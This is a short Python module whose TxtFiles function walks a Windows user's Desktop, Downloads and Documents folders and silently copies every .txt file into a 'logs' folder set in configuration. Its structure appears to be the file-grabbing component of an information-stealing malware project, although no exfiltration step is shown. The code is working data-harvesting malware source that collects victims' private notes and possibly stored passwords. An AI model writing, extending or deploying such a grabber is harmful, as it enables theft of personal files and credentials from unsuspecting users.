from os import environ, walk, makedirs
from os.path import join
from shutil import copy2
from manager.logger import Log
from preferences.config import config

def copy_txt_files(source_folder, destination_folder):
    try:
        for root, dirs, files in walk(source_folder):
            for file in files:
                if file.endswith('.txt'):
                    source_path = join(root, file)
                    destination_path = join(destination_folder, file)
                    copy2(source_path, destination_path)
    except Exception as error:
        Log(error)

def TxtFiles():
    Log("===========TxtFiles===========")
    user = environ["USERPROFILE"]
    dest_folder = join(config.pathToLogs, "Files")
    desktop = join(dest_folder, "Desktop")
    downloads = join(dest_folder, "Downloads")
    documents = join(dest_folder, "Documents")

    makedirs(desktop, exist_ok=True)
    makedirs(downloads, exist_ok=True)
    makedirs(documents, exist_ok=True)

    copy_txt_files(join(user, "Desktop"), desktop)
    copy_txt_files(join(user, "Downloads"), downloads)
    copy_txt_files(join(user, "Documents"), documents)